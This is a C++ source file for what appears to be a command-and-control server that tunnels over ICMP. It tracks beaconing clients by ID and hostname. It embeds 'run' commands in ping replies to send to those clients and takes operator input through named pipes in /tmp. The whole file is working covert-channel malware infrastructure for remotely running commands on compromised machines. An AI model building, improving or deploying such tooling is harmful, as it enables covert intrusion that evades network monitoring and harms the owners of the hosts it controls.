#include <cstdint>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <sstream>
#include <map>
#include <vector>
#include <thread>
#include <mutex>

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

struct buffer
{
  int pos{ 0 };
  bool ready{ false };
  std::vector<uint8_t> data;
};

struct connection
{
  connection(const std::string &ip)
    : ip{ ip }
  {}
  std::string ip;
  std::string hostname;
  buffer out_buf;
  buffer in_buf;
};

using connections_t = std::map<uint32_t, connection>;

static uint32_t next_connection_id = 1000;

static connections_t active_connections;
static std::mutex active_connections_mutex;

static int out_pipefd, in_pipefd;

static bool running = false;

static uint16_t checksum(uint16_t *ptr, int nbytes)
{
  uint64_t sum;
  uint16_t oddbyte, rs;

  sum = 0;
  while (nbytes > 1) {
    sum += *ptr++;
    nbytes -= 2;
  }

  if (nbytes == 1) {
    oddbyte = 0;
    *((uint8_t *)&oddbyte) = *(uint8_t *)ptr;
    sum += oddbyte;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  rs = ~sum;
  return rs;
}

void termination_handler(int signo)
{
  std::puts("Killing process!");
  running = false;
}

void listen_task()
{
  int sockfd;
  uint8_t in[1024];
  sockaddr_in addr;

  if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
    perror("socket");
    std::exit(-1);
  }

  uint8_t flush = 0x00;
  while (running) {
    std::memset(in, 0, sizeof(in));
    size_t nbytes = read(sockfd, in, sizeof(in));

    if (nbytes <= 0) continue;

    iphdr *ip = (iphdr *)in;

    if (nbytes > sizeof(iphdr)) {
      nbytes -= sizeof(iphdr);
      icmphdr *icmp = (icmphdr *)(in + sizeof(iphdr));

      size_t packet_size = sizeof(icmphdr);
      uint32_t id;

      if (nbytes == sizeof(icmphdr)) {
        std::lock_guard<std::mutex> guard(active_connections_mutex);
        id = next_connection_id++;
        active_connections.insert({ id, connection{ inet_ntoa(in_addr{ ip->saddr }) } });
        std::memcpy(icmp + 1, &id, sizeof(id));
        packet_size += sizeof(id);
        std::cout << "New connection with id=" << id << "\n";
      } else {
        nbytes -= sizeof(icmphdr);
        if (nbytes < sizeof(uint32_t)) continue;

        std::memcpy(&id, icmp + 1, sizeof(uint32_t));
        nbytes -= sizeof(id);

        auto &connection = active_connections.at(id);
        auto &in_buf = connection.in_buf;
        auto &out_buf = connection.out_buf;

        if (nbytes > 0) {
          std::lock_guard<std::mutex> guard(active_connections_mutex);
          size_t index = sizeof(iphdr) + sizeof(icmphdr) + sizeof(uint32_t);
          if (in[index] == 'b') {
            connection.hostname = std::string{ (char *)&in[index + 1], nbytes - 1 };
          } else {
            in_buf.data.insert(in_buf.data.end(), &in[index], &in[index + nbytes]);
          }
        }

        std::memcpy(&in[sizeof(iphdr) + packet_size], &id, sizeof(id));
        packet_size += sizeof(id);

        std::memcpy(&in[sizeof(iphdr) + packet_size], &flush, sizeof(flush));
        packet_size += sizeof(flush);

        if (flush == 0x01) {
          flush = 0x00;
        }

        if (out_buf.ready && out_buf.pos < out_buf.data.size()) {
          std::lock_guard<std::mutex> guard(active_connections_mutex);
          size_t to_write = (out_buf.data.size() - out_buf.pos) > 64 ? 64 : (out_buf.data.size() - out_buf.pos);
          std::memcpy(&in[sizeof(iphdr) + packet_size], out_buf.data.data() + out_buf.pos, to_write);
          out_buf.pos += to_write;
          packet_size += to_write;
          if (out_buf.pos >= out_buf.data.size()) {
            std::cout << "Flushing data for id=" << id << "\n";
            out_buf.data.clear();
            out_buf.pos = 0;
            out_buf.ready = false;
            flush = 0x01;
          }
        }
      }

      icmp->type = 0;
      addr.sin_family = AF_INET;
      addr.sin_port = htons(0);
      addr.sin_addr.s_addr = ip->saddr;

      icmp->checksum = 0x00;
      icmp->checksum = checksum((uint16_t *)icmp, packet_size);

      if (sendto(sockfd, icmp, packet_size, 0, (sockaddr *)&addr, sizeof(addr)) == -1) {
        perror("sendto");
        std::exit(-1);
      }
    }
  }

  close(sockfd);
}

void send_command(const std::string &idstr, const std::string &command)
{
  std::string cmd = "run ";
  cmd.append(command);

  std::stringstream ss(idstr);

  uint32_t id;
  ss >> id;

  std::lock_guard<std::mutex> guard(active_connections_mutex);
  if (active_connections.find(id) == active_connections.end()) {
    return;
  }
  auto &connection = active_connections.at(id);

  connection.out_buf.data.assign(cmd.begin(), cmd.end());
  connection.out_buf.ready = true;

  std::cout << "Sending command:" << command << " to id=" << id << "\n";

  // // listen for response packets
  // while (1) {
  //   uint8_t in[512];

  //   // receive a ping and store the ip addres
  //   std::string src_ip;
  //   ssize_t num_bytes = recv_ping(sockfd, src_ip, in, sizeof(in));

  //   if (dst != src_ip)
  //     continue;

  //   if (num_bytes > 0) {

  //     char *str_ = (char *)in;
  //     std::string str(str_, num_bytes);

  //     // only store hostname into active connections list if a beacon is sent
  //     auto split = split_input(str);
  //     if (split.at(0).compare("(beacon)") != 0) {
  //       // put command ouput to stdout
  //       std::fputs(str.c_str(), stdout);
  //     }
  //   } else {
  //     break;
  //   }
  // }
}

void refresh()
{
  std::lock_guard<std::mutex> guard(active_connections_mutex);

  size_t count = active_connections.size();
  if (write(out_pipefd, &count, sizeof(count)) == -1) {
    perror("write()");
  }

  for (auto it = active_connections.begin();
       it != active_connections.end();
       it++) {

    std::string out{ it->second.hostname };
    out.append("(").append(std::to_string(it->first)).append(")");

    if (write(out_pipefd, out.c_str(), out.size()) == -1) {
      perror("write()");
    }
  }
}

int main(int argc, char **argv)
{

  // make pipes
  umask(0);
  if (mkfifo("/tmp/pingd_in", S_IFIFO | 0666) == -1) {
    if (errno != EEXIST) {
      perror("mkfifo");
      exit(-1);
    }
  }

  if (mkfifo("/tmp/pingd_out", S_IFIFO | 0666) == -1) {
    if (errno != EEXIST) {
      perror("mkfifo");
      exit(-1);
    }
  }

  // set signals
  struct sigaction new_action, old_action;
  new_action.sa_handler = termination_handler;
  sigemptyset(&new_action.sa_mask);
  new_action.sa_flags = 0;

  sigaction(SIGINT, NULL, &old_action);
  if (old_action.sa_handler != SIG_IGN)
    sigaction(SIGINT, &new_action, NULL);
  sigaction(SIGHUP, NULL, &old_action);
  if (old_action.sa_handler != SIG_IGN)
    sigaction(SIGHUP, &new_action, NULL);
  sigaction(SIGTERM, NULL, &old_action);
  if (old_action.sa_handler != SIG_IGN)
    sigaction(SIGTERM, &new_action, NULL);

  // start thread
  running = true;
  std::thread listen_thread{ listen_task };

  if ((in_pipefd = open("/tmp/pingd_in", O_RDONLY)) == -1) {
    perror("open()");
    return -1;
  }

  if ((out_pipefd = open("/tmp/pingd_out", O_WRONLY)) == -1) {
    perror("open()");
    return -1;
  }

  while (running) {
    uint8_t buf[1024];
    size_t nbytes;
    if ((nbytes = read(in_pipefd, buf, 1024)) == -1) {
      perror("read()");
    }

    if (nbytes == 0) {
      continue;
    }

    std::string in_str{ (char *)buf, nbytes };

    if (in_str == "refresh") {
      refresh();
      continue;
    }

    auto cmd_pos = in_str.find(' ');
    auto id_bg_pos = in_str.find('(');
    auto id_ed_pos = in_str.find(')');

    std::string cmd = in_str.substr(0, cmd_pos);
    std::string id = in_str.substr(id_bg_pos + 1, id_ed_pos - id_bg_pos - 1);
    std::string arg = in_str.substr(id_ed_pos + 2);

    if (cmd == "send_command") {
      send_command(id, arg);
    }
  }

  close(in_pipefd);
  close(out_pipefd);

  return 0;
}